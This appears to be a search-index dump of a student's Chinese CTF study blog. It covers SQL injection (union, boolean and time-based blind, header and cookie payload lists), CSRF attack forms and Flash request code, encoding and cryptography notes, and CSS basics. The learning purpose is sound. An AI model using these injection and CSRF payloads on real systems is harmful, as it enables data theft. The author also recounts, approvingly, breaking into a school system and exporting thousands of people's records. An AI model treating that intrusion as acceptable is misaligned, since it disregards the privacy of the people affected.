echo&quot;&lt;script&gt;alert(&#x27;注册失败！&#x27;);location.href = &#x27;register.html&#x27;;&lt;/script&gt;&quot;;&#125;?&gt; 这样一个简易的（破烂的）登录注册功能就基本完成了。（后续可以试一下注入自己的（手动滑稽）） 后续完成了一个简单的登录注册功能，后续要考虑的问题其实包括但不限于： 安全问题（包括但不限于防注入、防爆破、防爬等） 前端美化 可维护性等 简单的登陆注册 应该是每一个coder的标配技能吧","categories":[{"name":"码农日常","slug":"码农日常","permalink":"http://favorhau.github.io/categories/%E7%A0%81%E5%86%9C%E6%97%A5%E5%B8%B8/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://favorhau.github.io/tags/SQL/"},{"name":"PHP","slug":"PHP","permalink":"http://favorhau.github.io/tags/PHP/"}]},{"title":"20201218学习日记---sql（三）","slug":"20201218学习日记---sql（三）","date":"2020-12-18T14:29:26.000Z","updated":"2020-12-18T14:29:48.000Z","comments":true,"path":"2020/12/18/20201218学习日记---sql（三）/","link":"","permalink":"http://favorhau.github.io/2020/12/18/20201218%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0---sql%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"了解（入门）其他的注入方式","text":"了解（入门）其他的注入方式 记录一下今天的心情吧：C++教得挺慢的，（不过还好假期学过了），可以省下很多功夫广州入冬，今天有点想去写代码（微信小程序挺有趣的）废话少说看了一下还有几个注入方式没学，（说实话觉得合天有些课程不是很好，所以经常左查右查别人的博客），比如说POST注入，其实和GET挺像的，只不过换了一种http method而已。 POST显错注入post显错注入和get方式很相似，同时分为 单引号类型1’OR 1# 双引号类型1&quot;) OR 1# POST盲注大体上和get盲注一样 只是一般以表单形式（换了一个method）。 Header注入HTTP HeaderHTTP请求头 原理 UA部分-基于错误HTTP_USER_AGENT（UA）是用来检查页面在用什么操作系统，等的相关信息。 实例：爬虫的伪装策略与防御网络爬虫的应用2. X-FORWARDED-FOR部分-基于错误XXF是用来识别http代理或者负载均衡方式连接到web服务器的客户端最原始的IP地址及其代理地址的协议。HTTP_X_FORWARD_FOR可以获取到最原始用户IP漏洞产生：相比于直接修改IP地址，修改XFF头更加容易漏洞利用： 伪造IP地址绕过限制，获取权限，删除痕迹。某些网站限制同一个IP只能登录一次，通过XFF的修改以达到多次登录的目的3. Referer 部分-基于错误HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。用于统计或者防盗链 具体实践一般可以使用burp suite ，在这里先用火狐浏览器插件，其实使用burp同理（觉得这个没必要请出不burp suite） UA这个是理想的headers注入页面此时可以将代理头修改为 1&#x27; union SELECT 1,2,3,uagent FROM uagents WHERE uagent like &#x27;%windows% 可将代理改为符合的白名单 ip老套路构造语句。 1’union select 1,2,3,ip_address from uagents where username=&#x27;root&#x27;# referer1&#x27; union SELECT 1,2,referer from referers where ip_address=&#x27;10.10.10.10&#x27;# 修改referer 和第一个UA有点像 总结总的来说都是老套路，实际上的话还会涉及到方方面面，在这里还有许多疑问，比方说 from后面一定要是referers吗？，select后面为什么要是1，2，目的何在？查找了一下—真正的需要构造许多payload一步步拆解（实战再说） cookie注入其实觉得cookie注入是里面最有趣的，常常浏览器会提示“储存cookie”等信息，类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密）。这里就需要用到base64.cookie注入本质就是：伪装成admin 将下面的语句 12&quot;union select * from users where id=14# 第一种&#x27;) union select * from users where id=12# 第二种 进行base64编码后以cookie方式上传。 写在后面习得了基本的概念性知识，具体实战需要磨练，比如说cookie注入-还需要使用到JavaScript，工具可以使用sqlmap进行。其实在这里 sql注入算是已经基本告一段落了，在这里我学到了基本的sql语句，为大二的数据库学习可以奠定一些基础。于此同时，对于CTF，可能还需要在题目实战的路上继续走。","categories":[{"name":"CTF求生之路","slug":"CTF求生之路","permalink":"http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://favorhau.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"20201217学习日记---cryto","slug":"20201217学习日记---cryto","date":"2020-12-17T15:59:26.000Z","updated":"2021-09-06T01:28:05.585Z","comments":true,"path":"2020/12/17/20201217学习日记---cryto/","link":"","permalink":"http://favorhau.github.io/2020/12/17/20201217%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0---cryto/","excerpt":"作为入门的ctf玩家，需要懂得常用的密码。","text":"作为入门的ctf玩家，需要懂得常用的密码。 说到密码，很多人会把MD5、base64等混淆在一起（包括我之前也会把md5称为“密码”）。其实严格区分起来，应该是： 加密(encipher/decipher)：加密传输信息，保证信息安全性，通过密钥和密文可以还原原始信息 编码(encode/decode)：将数据转化成某种固定格式的编码信息，方便不同系统间的传输，通过解码编码信息可以得到原始信息。 散列(hash)：也叫摘要或哈希，验证信息的完整性，不能通过哈希值还原原始信息。 比起系统学习各种密码（编码），更多的应该是在做题、项目中习得，比方说url编码、base64编码等就经常会被使用。 编码常见的编码：ASCII（美国信息交换标准代码）、Base64、URL编码、HTML编码、Unicode编码、UTF-8、莫斯电码、二维码 ASCII（American Standard Code for Information Interchange，美国标准信息交换代码）是基于拉丁字母的一套电脑编码系统，主要用于显示现代英语和其他西欧语言。它是现今最通用的单字节编码系统，并等同于国际标准ISO/IEC 646。 Base64一般可以用来处理在HTTP环境下传递较长的标识信息 URL编码这个是非常常见的 不能漏掉（相当于一种规范） UnicodeUnicode是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。（其实一直对Unicode 、 gbk 、utf-8 不理解，直到我看到了这个）传送门Unicode：OSI指定的编码标准；GBK：Chinese Internal Code Specification 汉字内码扩展规范UTF-8：一种针对Unicode的一种可变长度字符编码 其他编码其实编码给我的感觉就是：无密码的密码剩下的还有诸如莫斯电码（不同网站出来的结果会不一样）、二维码这些。 加密加密常规一般可以分为，对称性加密目前研究已经相对充分，而非对称性加密还有很长的路需要走。 对称性加密（symmetrical encryption） 非对称性加密（Asymmetric encryption） 对称性加密“对称密钥”的加密算法主要有DES、TripleDES、RC2、RC4、RC5和Blowfish等。以上的加密算法基本准寻以下算法特征： 加密方和解密方使用同一个密钥； 加密解密的速度比较快，适合数据比较长时的使用； 密钥传输的过程不安全，且容易被破解，密钥管理也比较麻烦； 非对称加密对称加密算法在加密和解密时使用的是同一个秘钥；而非对称加密算法需要两个密钥来进行加密和解密，这两个密钥是公开密钥（public key，简称公钥）和私有密钥（private key，简称私钥）非对称性加密一般有：RSA、DSA、ECDSA。 说到非对称性加密 那就不得不说RSA了。 RSARSA公开密钥密码体制是一种使用不同的加密密钥与解密密钥，“由已知加密密钥推导出解密密钥在计算上是不可行的”密码体制。找了挺多的体制解释，比较好的是这个传送门梳理了一下思路 大概上就分为四个步骤。 选取素数n 选取大整数e 确定密钥d 公开n和e保存d当然具体过程并没有那么简单。而如果要破解此加密的关键就是选取的大素数n无法被分解（目前仅能分解到2048位)但是 2020年12月4日，中国科学技术大学宣布该校潘建伟等人成功构建76个光子的量子计算机九章当然，要对付量子计算机，会有专门的量子密码（仅了解，虽然我也不懂具体是啥）诚然，从来就没有绝对的安全。安全都是相对的。 其他非对称性加密对称性加密最经典的、以及最常见常用的应该是RSA。公钥密码体制采用的加密密钥(公开钥)和解密密钥(秘密钥)是不同的。由于加密密钥是公开的，密钥的分配和管理就很简单，而且能够很容易地实现数字签名，因此最适合于电子商务应用的需要。其主要的优点是：(1)密钥分配简单。(2)密钥的保存量少。(3)可以满足互不相识的人之间进行私人谈话时的保密性要求。(4)可以完成数字签名和数字鉴别。但在实际应用中，公钥密码体制并没有完全取代私钥密码体制，这是因为公钥密码体制在应用中存在以下几个缺点：(1)公钥密码是对大数进行操作，计算量特别浩大，速度远比不上私钥密码体制。(2)公钥密码中要将相当一部分密码信息予以公布，势必对系统产生影响。(3)在公钥密码中，若公钥文件被更改，则公钥被攻破。（摘自百度百科） 哈希常见摘要：MD5、SHA1（主要适用于数字签名标准DSS里面定义的数字签名算法）无论多长的一段数据经过MD5之后都会变成指定的长度。把MD5称为“加密”应当是不准确的，MD（Message-Digest Algorithm）信息摘要算法最直观的应该是MD5不可逆，（虽然有很多声称MD5破解的网站）有MD5,也有MD4,MD2等。目前没有软件能有效地破解 MD5。大多数时候只是把常见字符串的 MD5 存了起来为彩虹表，然后直接反查。所谓”破解“的网站无非就是存了大量的可能密码。比如 https://cmd5.com/ 写在后面CTF基本上看不懂的文字上面大都已经涵盖（可能只是小部分），在实战中（听说）还会出现诸如彩虹密码等新型密码，这就得看造化（yun qi）了。","categories":[{"name":"CTF求生之路","slug":"CTF求生之路","permalink":"http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"}],"tags":[{"name":"cryto","slug":"cryto","permalink":"http://favorhau.github.io/tags/cryto/"}]},{"title":"20201216学习日记---sql注入（二）","slug":"20201216学习日记---sql注入（二）","date":"2020-12-16T12:28:26.000Z","updated":"2021-09-06T01:27:15.212Z","comments":true,"path":"2020/12/16/20201216学习日记---sql注入（二）/","link":"","permalink":"http://favorhau.github.io/2020/12/16/20201216%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0---sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"前面认识了一些 sql的操作 ，下面进一步探究。注入攻击的本质，是把用户输入的数据当做代码执行","text":"前面认识了一些 sql的操作 ，下面进一步探究。注入攻击的本质，是把用户输入的数据当做代码执行 GET注入-SQL显错注入判断注入点显错注入最简单的方法：页面传参后加 ‘,看看是否报错。最古老的方法：1=1//页面正常1=2//页面不正常GET注入一般分为 单引号型 在参数后加’ 数字型 在参数后加数字 单引号变形 在参数后加’) 双引号 在参数后加” 显错注入-联合查询1union select * from users--+ 其实看了挺久 ，为什么需要添加–+呢？ 后来通过查询发现，提交的语句为127.0.0.1/less-1/?id=’1’ order by 3’ 这样就会报错，但是加了注释，提交的语句就是这样127.0.0.1/less-1/?id=’1’ order by 3#’,后面的单引号就被注释掉了，就没有问题。 常用显错注入语句 and 1=1/and 1=2 判断是否存在注入 and 1=1 order by 3 按哪一列进行排序，从而可以确定有多少列 and 1=2 union select 1,2,3 查看页面中显示哪些数字,比如显示2，3 and 1=2 union select 1,2,database() 原本显示3的位置会显示数据库名称 and 1=2 union select 1,2,version() 会显示数据库版本 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= database() 查询当前数据库下的表名 and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’表名’ 查看数据库字段名 and 1=2 union select 1,2,group_concat(字段名) from 表名 查看字段内容 GET注入-盲注get盲注一般分为 基于布尔的盲注。这种方法主要通过页面的返回内容不同来获取信息。 基于时间的盲注。这种方法主要通过页面的响应时间不同来获取信息。 盲注需要掌握的MySQL相关函数 1234567length(str)#返回str字符串的长度。如执行selectlength(database())#则会返回当前数据库名称的长度。而单独selectdatabase()#则回返回当前数据库的名称。substr(str, pos, len)#从pos位置取出str字符串的len个字符。如select substring(&#x27;abcde&#x27;, 4, 2)#则返回de，pos为负则倒数pos个位置select substring(&#x27;abcde&#x27;, -4, 2);#返回bc。ASCII(str)#返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL。如select ASCII(&#x27;a&#x27;)返回97。 除此之外还有条件语句 1if ((exp1, exp2, exp3) #为条件判断语句。当exp1的值为true时候，返回exp2，否则返回exp3。 在注入的时候上述的语句容易被拦截 故可用下面的语句代替 1select case when (条件) then 代码1 else 代码2 end 布尔盲注 原理：在页面中，如果正确执行了sql语句，则返回一种页面，如果执行错误，则执行另一种页面。基于这两种页面，判断sql正确与否。 获取(猜测)数据库长度1and (select length(database()))&gt;长度--+ 猜测数据表名称1and (select ascii(substr(database(),1,1)))&gt;名称--+ 猜解表名数量12and (select count(table_name) from information_schema.tables where table_schema=database())=数量 # information_schema.tables 专门用来储存所以表，5.0以上版本才有 猜解某个表长度1and (select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度 #同理n从0来表示变化的表来求该库下的对应的表的长度 逐位猜解表名12and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema = database() limit n,1)=ascii码 #从前面的1变化是求表名，而n变化是对应的库中的表 猜解列名数量1and (select count(*) from information_schema.columns where table_schema =database() and table_name = 表名)=数量#information_schema.columns 专门用来存储所有的列 猜解某个列长度1and (select length(column_name) from information_schema.columns where table_name=&quot;表名&quot; limit n,1)=长度 逐位猜解列名1and (select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name=&quot;表名&quot; limit n,1)=ascii码 判断数据的数量1and (select count(列名) from 表名)=数量 猜解某条数据的长度1and (select length(列名) from 表名 limit n,1)=长度 逐位猜解数据1and (select ascii(substr(user,位数,1)) from 表名 limit n,1)=ascii码 时间盲注布尔盲注是根据页面正常否进行注入，而时间盲注则是通过SQL语句查询的时间来进行注入,一般是在页面无回显，无报错的情况下使用 可以通过F12来看其页面回显的时间与布尔盲注是一样的 猜解数据库长度1and if((select length(database()))=长度,sleep(6),0) 猜解数据库名1and if((select ascii(substr(database(),位数,1))=ascii码),sleep(6),0) 判断表名的数量1and if((select count(table_name) from information_schema.tables where table_schema=database())=个数,sleep(6),0) 判断某个表名的长度1and if((select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度,sleep(6),0) 逐位猜表名1and if((select ascii(substr(table_name,位数,1)) from information_schema.tables where table_schema=database() limit n,1)=ascii码,sleep(6),0) 判断列名数量1and if((select count(column_name) from information_schema.columns where table_name=&quot;表名&quot;)=个数,sleep(6),0) 判断某个列名的长度1and if((select length(column_name) from information_schema.columns where table_name=&quot;表名&quot; limit n,1)=长度,sleep(6),0) 逐位猜列名1and if((select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name=&quot;表名&quot; limit n,1)=ascii码,sleep(6),0) 判断数据的数量1and if((select count(列名) from 表名)=个数,sleep(6),0) 判断某个数据的长度1and if((select length(列名) from 表名)=长度,sleep(6),0) 逐位猜数据1and if((select ascii(substr(列名,n,1)) from 表名)=ascii码,sleep(6),0) 写在后面本次学习习得了两种常用注入方式，进而在此过程中提高了对sql语句的认知，但是说实话这些语句需要备忘录，很多会忘记。看了那么多 我又想起了最初的那一句话 除了get注入之外 还有post注入、headers注入等注入方式，接下来将对其展开学习。","categories":[{"name":"CTF求生之路","slug":"CTF求生之路","permalink":"http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://favorhau.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"20201214学习日记---sql注入","slug":"20201214学习日记---sql注入","date":"2020-12-14T05:28:26.000Z","updated":"2020-12-15T16:31:18.000Z","comments":true,"path":"2020/12/14/20201214学习日记---sql注入/","link":"","permalink":"http://favorhau.github.io/2020/12/14/20201214%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0---sql%E6%B3%A8%E5%85%A5/","excerpt":"终于来到sql注入的学习了，sql注入先是给我了很“黑客”的感觉，之前有操作过phpmyadmin，接触了数据库普通的“查删减改”（大多数都是在后端云干的），那sql语句长什么样子呢，sql注入又是如何。","text":"终于来到sql注入的学习了，sql注入先是给我了很“黑客”的感觉，之前有操作过phpmyadmin，接触了数据库普通的“查删减改”（大多数都是在后端云干的），那sql语句长什么样子呢，sql注入又是如何。 介绍SQL注入望文生义先是与sql有关。想了解如何注入 我想需要先了解一下SQL。SQL （Structured Query Language）结构化查询语言，常见的SQL数据库有MySQL、sql、server，Oracle、Sybase等。在开始之前使用了一个很好用的php集成开发环境-phpstudy其支持一键LAMP,LNMP,集群,监控,网站,FTP,数据库,JAVA等100多项服务器管理功能 SQL结构sql结构如图所示，如图：数据表-字段-数据这样的结构。 SQL数据类型SQL数据类型除了常规的整型、文本型，又细分了具体的类型。比如text分为char、varchar等。具体分类 常用的SQL语句在概念里面，SQL常用的应该是【查、删、减、改】，后面应该对这四个最基本的熟练掌握。 SQL表约束 show databases;查询数据库 create table tablename;新增数据表 …写到这里发现不想写下去，因为语句太多太多了，基本上就是按照上面说的sql结构进一步操作。（这让我想起来phpmyadmin的可视化数据表好方便） 基本SQL注入information_schema数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。 进入到系统自带的information_schema1use information_schema; 显示数据表1show tables; 显示数据表1select * from tables; 最后就会出现如图结果。 SQL的发现SQL注入的产生–从代码层次理解 总的来说：web没有对用户输入的数据进行严格的过滤，就把sql带进数据库进行查询。 SQL注入的发现找到有可能用到sql查询语句的地方寻找所有有可能出现SQL交互的 写在后面学习了基本的sql结构，下一步可以是sql注入的实践，期望更有收获。","categories":[{"name":"CTF求生之路","slug":"CTF求生之路","permalink":"http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://favorhau.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"20201209学习日记---Csrf","slug":"20201209学习日记","date":"2020-12-09T11:28:26.000Z","updated":"2020-12-09T10:09:16.000Z","comments":true,"path":"2020/12/09/20201209学习日记/","link":"","permalink":"http://favorhau.github.io/2020/12/09/20201209%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/","excerpt":"早几年了解过HTTP请求，今天从CTF的角度上去看了一下请求中存在的漏洞。","text":"早几年了解过HTTP请求，今天从CTF的角度上去看了一下请求中存在的漏洞。 HTTP请求HTTP其实很多学问，包括请求头（header），代理（agent）等等，在这里先再了解一下几个常用的HTTP请求。最常用的应该是get和post了，而除此之外还有put delete 等等。表单提交中get和post方式的区别有5点 get是从服务器上获取数据，post是向服务器传送数据。 get是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段一一对应，在URL中可以看到。post是通过HTTPpost机制，将表单内各个字段与其内容放置在HTML HEADER内一起传送到ACTION属性所指的URL地址。用户看不到这个过程。 对于get方式，服务器端用Request.QueryString获取变量的值，对于post方式，服务器端用Request.Form获取提交的数据。 get传送的数据量较小，不能大于2KB。post传送的数据量较大，一般被默认为不受限制。但理论上，IIS4中最大量为80KB，IIS5中为100KB。（这里有看到其他文章介绍get和post的传送数据大小跟各个浏览器、操作系统以及服务器的限制有关） get安全性非常低，post安全性较高。根据以往的经验来看，大多数api的请求都要求使用post方式。而一般流量一般的网页则用get方式。而put和delete很少用，且很多都能够用post代替。 CSRF跨站请求伪造钓鱼网站，界面操作和真是的页面一模一样，当用户操作转账功能的时候，转账数据也会发送到真实的后台，但是其中用户输入的信息中对端账户可能会被修改掉，导致用户确实转账了，但是钱却转给了别人 以下内容摘自ctfwiki： CSRF 类型按请求类型，可分为 GET 型和 POST 型。 按攻击方式，可分为 HTML CSRF、JSON HiJacking、Flash CSRF 等。 HTML CSRF利用 HTML 元素发出 CSRF 请求，这是最常见的 CSRF 攻击。 HTML 中能设置 src/href 等链接地址的标签都可以发起一个 GET 请求，如： 123456789101112131415&lt;link href=&quot;&quot;&gt;&lt;img src=&quot;&quot;&gt;&lt;img lowsrc=&quot;&quot;&gt;&lt;img dynsrc=&quot;&quot;&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=&quot;&gt;&lt;iframe src=&quot;&quot;&gt;&lt;frame src=&quot;&quot;&gt;&lt;script src=&quot;&quot;&gt;&lt;/script&gt;&lt;bgsound src=&quot;&quot;&gt;&lt;/bgsound&gt;&lt;embed src=&quot;&quot;&gt;&lt;/bgsound&gt;&lt;video src=&quot;&quot;&gt;&lt;/video&gt;&lt;audio src=&quot;&quot;&gt;&lt;/audio&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;table background=&quot;&quot;&gt;&lt;/table&gt;...... 还有 CSS 样式中的： 123@import &quot;&quot;background:url(&quot;&quot;)...... 也可使用表单来对 POST 型的请求进行伪造。 12345678910&lt;form action=&quot;http://www.a.com/register&quot; id=&quot;register&quot; method=&quot;post&quot;&gt; &lt;input type=text name=&quot;username&quot; value=&quot;&quot; /&gt; &lt;input type=password name=&quot;password&quot; value=&quot;&quot; /&gt;&lt;/form&gt;&lt;script&gt; var f = document.getElementById(&quot;register&quot;); f.inputs[0].value = &quot;test&quot;; f.inputs[1].value = &quot;passwd&quot;; f.submit();&lt;/script&gt; Flash CSRFFlash 也有各种方式可以发起网络请求，包括 POST。 123456789import flash.net.URLRequest;import flash.system.Security;var url = new URLRequest(&quot;http://target/page&quot;);var param = new URLVariables();param = &quot;test=123&quot;;url.method = &quot;POST&quot;;url.data = param;sendToURL(url);stop(); Flash 中还可以使用 getURL、loadVars 等方式发起请求。 123req = new LoadVars();req.addRequestHeader(&quot;foo&quot;, &quot;bar&quot;);req.send(&quot;http://target/page?v1=123&amp;v2=222&quot;, &quot;_blank&quot;, &quot;GET&quot;); CSRF实例直接通过引文中的内容来实例化，进行CSRF攻击需要有两样东西 cookie 仿造表单用户正常登录 用户在正常访问目标网站的时候登录账户，产生相应的cookie，成功变成登录状态。 用户在不知情的情况下进入受到篡改的网页。 跨站请求伪造这时候需要伪造一个网页，表单值账户填写自己的账户即可，示例代码 12345&lt;form action=&quot;http://127.0.0.1/&quot; id=&quot;register&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;to_account&quot; value=&quot;admin&quot; /&gt;&lt;/br&gt; &lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;9999&quot; /&gt;&lt;/br&gt; &lt;input type=&quot;submit&quot; value=&quot;点击领取优惠卷&quot; /&gt;&lt;/form&gt; 示例图： 模拟表单向目标服务器发送请求通过模拟表单 向已经登录的网站发送请求 即可完成csrf攻击。 CSRF防御常见的csrf防御其实经常可以见到。 验证码验证码强制用户必须与应用进行交互，才能完成最终请求。所以这样为什么那么多网站需要设置验证码，当然验证码的作用还不知这些，比方说还有防爬等作用。 验证Referer检查请求是否来自合法的源。但服务器并非什么时候都能取得 Referer TokenCSRF 能够攻击成功的本质原因是重要操作的所有参数都可以被攻击者猜测得到。token验证（应该也是最常用的验证方式），在许多api的开发文档当中都会涉及到验证token的环节。Token must be random enough. In addition, the purpose of Token is not to prevent duplicate submissions, so for the convenience of use, it is allowed to use the same Token in the lifetime of a user before the Token is consumed, but if the user has already submitted the form, the Token has Consumed, the token should be regenerated.Token should also pay attention to its confidentiality. If the Token appears in the URL, it may be leaked through the Referer. Try to put the Token in the form, change the sensitive operation from GET to POST, submit it as a form or AJAX, avoid Token. Give way. 写在后面这样的攻击（我甚至觉得这不应该称为攻击）常常出现在我们周边，当然真正的攻击远不止那么简单，需要用到多方面的漏洞，当然对于攻击的防御现在运用到哈希散列等等的知识。","categories":[{"name":"CTF求生之路","slug":"CTF求生之路","permalink":"http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"}],"tags":[]},{"title":"20201207学习日记","slug":"20201207学习日记","date":"2020-12-07T11:28:26.000Z","updated":"2021-09-06T01:26:59.783Z","comments":true,"path":"2020/12/07/20201207学习日记/","link":"","permalink":"http://favorhau.github.io/2020/12/07/20201207%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/","excerpt":"想学习“世界上最好的语言” PHP，想从前端三大件入门。前些时间看了一些html基础，今日看了一下CSS。希望能快点进入JavaScript的学习。","text":"想学习“世界上最好的语言” PHP，想从前端三大件入门。前些时间看了一些html基础，今日看了一下CSS。希望能快点进入JavaScript的学习。 写在前面由于未深入到具体项目层次，仅于W3C中简要习得一些基本的标记，勿喷。 CSS基础语法选择器1selector &#123;declaration1; declaration2; ... declarationN &#125; 选择器通常是您需要改变样式的 HTML 元素。每条声明由一个属性和一个值组成。属性（property）是您希望设置的样式属性（style attribute）。每个属性有一个值。属性和值被冒号分开。这也很像html里面的“value：key”方式。 1selector &#123;property: value&#125; 下面这行代码的作用是将 h1 元素内的文字颜色定义为红色，同时将字体大小设置为 14 像素。在这个例子中，h1 是选择器，color 和 font-size 是属性，red 和 14px 是值。 1h1 &#123;color:red; font-size:14px;&#125; 选择器的分组可以对选择器进行分组，这样，被分组的选择器就可以分享相同的声明。 123h1,h2,h3,h4,h5,h6 &#123; color: green; &#125; （在模板里面经常见到这种用法（或者使用bootstrap等的时候））其中有关继承的问题，比方说子元素继承父元素的属性。 12345678910111213141516&lt;html&gt;&lt;head&gt; &lt;style&gt; .generate&#123; color: red; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;generate&quot;&gt; &lt;p&gt; this is a paragraph &lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 这样的话&lt;p&gt;就会显示为红色。 派生选择器我希望列表中的 strong 元素变为斜体字，而不是通常的粗体字，可以这样定义一个派生选择器： 1234li strong &#123; font-style: italic; font-weight: normal; &#125; 12345&lt;p&gt;&lt;strong&gt;我是粗体字，不是斜体字，因为我不在列表当中，所以这个规则对我不起作用&lt;/strong&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;strong&gt;我是斜体字。这是因为 strong 元素位于 li 元素内。&lt;/strong&gt;&lt;/li&gt;&lt;/font&gt; &lt;li&gt;我是正常的字体。&lt;/ol&gt; 在上面的例子中，只有 li 元素中的 strong 元素的样式为斜体字，无需为 strong 元素定义特别的 class 或 id，代码更加简洁。 id 选择器下面的两个 id 选择器，第一个可以定义元素的颜色为红色，第二个定义元素的颜色为绿色： 12#red &#123;color:red;&#125;#green &#123;color:green;&#125; 下面的 HTML 代码中，id 属性为 red 的 p 元素显示为红色，而 id 属性为 green 的 p 元素显示为绿色。 12&lt;p id=&quot;red&quot;&gt;这个段落是红色。&lt;/p&gt;&lt;p id=&quot;green&quot;&gt;这个段落是绿色。&lt;/p&gt; 在现代布局中，id 选择器常常用于建立派生选择器。 12345#sidebar p &#123; font-style: italic; text-align: right; margin-top: 0.5em; &#125; 上面的样式只会应用于出现在 id 是 sidebar 的元素内的段落。 类选择器终于到最重要的部分了，可能也是最主要需要用到的部分。 在 CSS 中，类选择器以一个点号显示： 1.center &#123;text-align: center&#125; 在上面的例子中，所有拥有 center 类的 HTML 元素均为居中。 在下面的 HTML 代码中，h1 和 p 元素都有 center 类。这意味着两者都将遵守 “.center” 选择器中的规则。(摘自w3c) 1234567&lt;h1 class=&quot;center&quot;&gt;This heading will be center-aligned&lt;/h1&gt;&lt;p class=&quot;center&quot;&gt;This paragraph will also be center-aligned.&lt;/p&gt; 和 id 一样，class 也可被用作派生选择器： 1234.fancy td &#123; color: #f60; background: #666; &#125; CSS创建大多数css早已分文件编写（外部样式表）。如果用于调整一个地方，使用内链样式表未尝不是一个做法吧。（我经常这样） 外部样式表可以用&lt;link&gt;标签链接外部样式表。 1234&lt;head&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mystyle.css&quot;/&gt;&lt;/head&gt; 内部样式表当单个文档需要特殊的样式时，就应该使用内部样式表。可以使用&lt;style&gt; 标签在文档头部定义内部样式表，就像这样: 123456&lt;head&gt;&lt;style type=&quot;text/css&quot;&gt; hr &#123;color: sienna;&#125; p &#123;margin-left: 20px;&#125;&lt;/style&gt;&lt;/head&gt; 内联样式style也可以作为标签的一个属性，不过需要慎用。 123&lt;p style=&quot;color: sienna; margin-left: 20px&quot;&gt;This is a paragraph&lt;/p&gt; 多重样式三种声明方式可以一起用，比方说可以单独修改某个样式，优先级为内联&gt;内部&gt;外联样式表。 写在后面之前试过客户端和后端云交换数据，没试过html和js的交互。浅尝了前面的Hyper Text Markup Language以及CSS后（当然如今的html5和CSS3提供了许多新的features，还有许多的plugins等着我去发掘），很期待之后JS的学习，体验这样的一门脚本语言。","categories":[{"name":"CTF求生之路","slug":"CTF求生之路","permalink":"http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"},{"name":"码农日常","slug":"码农日常","permalink":"http://favorhau.github.io/categories/%E7%A0%81%E5%86%9C%E6%97%A5%E5%B8%B8/"}],"tags":[]},{"title":"20201205学习日记","slug":"20201205学习日记","date":"2020-12-05T10:09:01.000Z","updated":"2020-12-05T10:10:00.000Z","comments":true,"path":"2020/12/05/20201205学习日记/","link":"","permalink":"http://favorhau.github.io/2020/12/05/20201205%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/","excerpt":"12月5日 志愿者节无指向性地看了一些合天网络安全实验室的知识","text":"12月5日 志愿者节无指向性地看了一些合天网络安全实验室的知识 启蒙第一次看合天1.5倍速去粗略看了一下让我感触最深的应该是说到“社会安全学“这门学科？ 我与网络安全由于曾经初中有一个集成系统当时年轻比较喜欢探索 最后用fiddler抓出了某些东西 最后拿到了这个在这里就不写具体的操作过程了，总之没有sql注入一个小小的cookie漏洞 参数投递漏洞（我也不知道这样说对不对，当时就是因为在aspx到php的参数出现的问题产生的漏洞）就控制了整一个校园网系统几千人的个人信息 就这样（被一个高中生）轻易导出那时候就感受到了许多地方真的不重视安全同时我也了解到了某些学籍信息不敢链接外网的原因（至少有安全意识的会这样做） 我与钓鱼人说道启蒙 我想到了一些”外行人“ 不论是钓鱼 还是其他的他们统一都说是”病毒“我还想到了当时的QQ空间的”相册钓鱼“当时就觉得他们很卑鄙 做这种事情 